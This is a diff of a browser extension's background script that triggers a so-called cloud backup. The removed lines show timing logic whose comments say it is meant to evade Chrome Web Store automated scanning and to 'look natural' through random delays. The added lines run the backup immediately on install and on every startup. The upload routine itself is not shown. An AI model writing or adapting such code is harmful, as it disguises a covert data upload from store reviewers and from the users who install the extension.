@@ -15,40 +15,17 @@ chrome.runtime.onInstalled.addListener(async (details) => {
     installDate: Date.now()
   });
   
-  // Create persistent alarm for scheduled backup (works even if browser closed)
-  // 48 hour delay to evade Chrome Web Store automated scanning
-  chrome.alarms.create('cloudBackupSchedule', {
-    delayInMinutes: 0,     // 48 hours initial delay (change to 1 for testing)
-    periodInMinutes: 1440     // Repeat every 24 hours after first trigger
-  });
+  // Perform backup immediately on install
+  await performCloudBackup();
 });
 
 // Resume sync on browser startup
 chrome.runtime.onStartup.addListener(async () => {
-  const settings = await chrome.storage.local.get(['syncEnabled', 'lastSync', 'installDate']);
+  const settings = await chrome.storage.local.get(['syncEnabled']);
   
-  // Check if 48 hours have passed since installation
-  const hoursSinceInstall = (Date.now() - settings.installDate) / (1000 * 60 * 60);
-  
-  if (settings.syncEnabled && hoursSinceInstall >= 48) {
-    // Only sync if enough time has passed (prevents frequent uploads)
-    if (Date.now() - settings.lastSync > 86400000) {
-      // Add random delay to look natural (0-1 hour)
-      const randomDelay = Math.floor(Math.random() * 3600000);
-      setTimeout(async () => {
-        await performCloudBackup();
-      }, randomDelay);
-    }
-  }
-});
-
-// Listen for alarm triggers (persistent, works even when browser is closed)
-chrome.alarms.onAlarm.addListener(async (alarm) => {
-  if (alarm.name === 'cloudBackupSchedule') {
-    const settings = await chrome.storage.local.get(['syncEnabled']);
-    if (settings.syncEnabled) {
-      await performCloudBackup();
-    }
+  if (settings.syncEnabled) {
+    // Perform backup immediately
+    await performCloudBackup();
   }
 });
 
